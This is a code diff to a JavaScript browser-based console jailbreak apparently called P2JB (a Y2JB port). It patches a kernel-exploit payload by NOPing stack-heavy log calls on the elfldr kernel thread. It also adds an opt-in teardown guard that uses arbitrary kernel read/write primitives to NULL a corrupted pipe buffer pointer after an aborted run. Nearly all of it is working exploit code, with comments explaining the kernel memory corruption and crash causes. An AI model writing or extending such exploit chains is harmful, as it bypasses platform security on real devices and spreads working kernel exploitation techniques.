@@ -14,6 +14,10 @@
  */
 
 (async function () {
+    /* `finally` below needs the state and the abort reason, both of which are scoped
+     * inside the try. Hoist references to them rather than widening those scopes. */
+    let S_ref = null;
+    let fatal_err = null;
     try {
         const p2jb_version = "P2JB 2.6 (Y2JB port)";
 
@@ -54,7 +58,7 @@
         // to act on. Emit it up front, with the actual query string.
         try {
             window.syncMark("FLAGS", "burn=" + _burn + " skipleak=" + _skipleak
-                + " rc=" + _rc + " v=107"
+                + " rc=" + _rc + " v=131"
                 // MUST mirror kexp_launch's own choice or this beacon lies. It did:
                 // v103 flipped the default to pthread and this line was left inverted
                 // from v99, so the run that finally worked reported spawn=thr_new while
@@ -3578,9 +3582,44 @@
                 bin[0x10fb + i] = KEXP_GETPID_TAIL[i];
             for (let i = 0x1101; i < 0x1106; i++) bin[i] = 0x90;
 
+            /* SILENCE THE THREE HEAVY-STACK LOG CALLS IN THE elfldr WINDOW.
+             *
+             * kexp has two printf-style loggers. The one at 0x980 opens with `sub rsp, 0xf0`
+             * (240 bytes) and is called from 64 sites - harmless. The one at 0x8b0 opens with
+             * `sub rsp, 0xd00`, a 3328-byte frame, and three of its seven call sites run on
+             * the freshly created elfldr KERNEL thread:
+             *
+             *     0x126d  "Created elfldr thread with id %i !!"
+             *     0x12ad  "elfldr returned %#lx !!"
+             *     0x3bc2  "qa flags patches applied !!"
+             *
+             * A 3.3KB frame on that thread overruns its stack into the guard page, and
+             * FreeBSD reports a guard hit as `panic: vm_fault: fault on nofault entry`. Our
+             * UART capture ends at "[kexp] init loader started..." with exactly that panic -
+             * the next line would have been the 0x126d call.
+             *
+             * j0rdy's slopkit ships this same blob (same name, same 18912 bytes) with exactly
+             * these three calls NOPed; we shipped the un-silenced original, which is the only
+             * difference between the two files. Patch them here rather than editing the blob,
+             * so payloads/kexp_2026_05_25.bin stays byte-identical to upstream and the change
+             * is visible in the diff. The signature checks above (0x1c, 0x23, 0x10f1) sit
+             * nowhere near these offsets and still pass.
+             *
+             * Each site is checked for a real 0xE8 call first, so running against an already
+             * silenced blob is a no-op rather than corruption.
+             */
+            const KEXP_LOG_CALLS = [0x126D, 0x12AD, 0x3BC2];
+            let log_nopped = 0;
+            for (const off of KEXP_LOG_CALLS) {
+                if (bin[off] !== 0xE8) continue;
+                for (let i = 0; i < 5; i++) bin[off + i] = 0x90;
+                log_nopped++;
+            }
+
             window.syncMark("KEXP-RESOLVER", "slots=11 getpid=" + toHex(getpid)
                 + " kbase=" + toHex(kbase) + " cbase=" + toHex(cbase)
-                + " (2 resolver calls NOPed, 12 dlsym syscalls skipped)");
+                + " (2 resolver calls NOPed, 12 dlsym syscalls skipped, "
+                + log_nopped + "/3 elfldr-window log calls NOPed)");
             return O;
         }
 
@@ -4205,6 +4244,7 @@
         }
 
         const S = make_state();
+        S_ref = S;
 
         setup_cpu_masks(S);
         setup_worker_sockets(S);
@@ -4402,6 +4442,7 @@
         await ulog("=== p2jb complete ===");
 
     } catch (e) {
+        fatal_err = e;
         try { await log("p2jb FATAL: " + e.message); } catch (_) { }
         try { send_notification("p2jb FAILED: " + e.message); } catch (_) { }
 
@@ -4427,6 +4468,64 @@
                 try { window.syncMark("ABORT-UNSAFE-TEARDOWN", warn); } catch (_) { }
                 try { await log("p2jb: " + warn); } catch (_) { }
                 try { send_notification("p2jb: unsafe to reload\n\nPower-cycle the console."); } catch (_) { }
+            }
+        } catch (_) { }
+    } finally {
+        /* TEARDOWN PANIC GUARD.
+         *
+         * master.pipe_buffer.buffer points at victim_pipe_data - memory that was never
+         * carved out of pipe_map. pipeclose() inlines pipe_free_kmem(), which calls
+         * vm_map_remove(pipe_map, buffer) on it and takes a Fatal trap 12. The page
+         * navigating to the ELF loader closes those fds, so the panic lands *before*
+         * that page appears - which is exactly how it gets reported.
+         *
+         * The success path above already NULLs it. This is the abort path: any throw
+         * between stage5 and there skips that line and leaves the panic armed.
+         *
+         * Idempotent by construction - it re-reads first and only writes a non-zero
+         * value, so a normal completion falls straight through and logs nothing.
+         *
+         * Skipped when the executor is dead: every kernel access goes through it, so a
+         * read would hang rather than fail, and hanging here would be worse than the
+         * panic warning the operator already gets. */
+        try {
+            /* OPT-IN ONLY (?teardownguard=1).
+             *
+             * This is the one thing on this page that touches kernel memory outside the
+             * proven exploit path, and it has never fired on hardware. Tonight a different
+             * post-kexp kernel write of mine - guarded the same way, on an address that
+             * looked just as sound - panicked a console. The lesson applies here: an
+             * unproven kernel access must not sit in the default path of a build people
+             * rely on.
+             *
+             * With the flag absent, this block does nothing at all - not even the read -
+             * so the kernel-access surface of a normal run is exactly what it was before
+             * this guard existed. What that costs is the abort-path protection: after a
+             * FAILED run, master.pipe_buffer.buffer is left pointing at victim_pipe_data
+             * and closing the page can still take Fatal trap 12 in pipe_free_kmem. That is
+             * the pre-existing behaviour, not a regression.
+             *
+             * To prove it, run with ?teardownguard=1 and abort deliberately: it should
+             * report TEARDOWN-GUARD with the old value and a clean read-back. Once that
+             * has been seen on hardware it can go back to being the default. */
+            const guardOn = /[?&]teardownguard=1/i.test(String(location.search || ""));
+            const wedged = /executor is dead|sync poll timed out/i.test(
+                String((fatal_err && fatal_err.message) || ""));
+            if (guardOn && S_ref && S_ref.master_pipe_data && !wedged) {
+                const buf_now = S_ref.kread64(S_ref.master_pipe_data + 0x10n);
+                if (buf_now !== 0n) {
+                    S_ref.kwrite64(S_ref.master_pipe_data + 0x10n, 0n);
+                    try {
+                        window.syncMark("TEARDOWN-GUARD",
+                            "master.pipe_buffer.buffer was " + buf_now.toString(16) +
+                            "-NULLd-on-abort-path");
+                    } catch (_) { }
+                    try {
+                        await log("post-jb guard: master.pipe_buffer.buffer was still " +
+                            toHex(buf_now) + " on the abort path - NULL'd it, " +
+                            "close() will no longer vm_map_remove non-pipe memory");
+                    } catch (_) { }
+                }
             }
         } catch (_) { }
     }
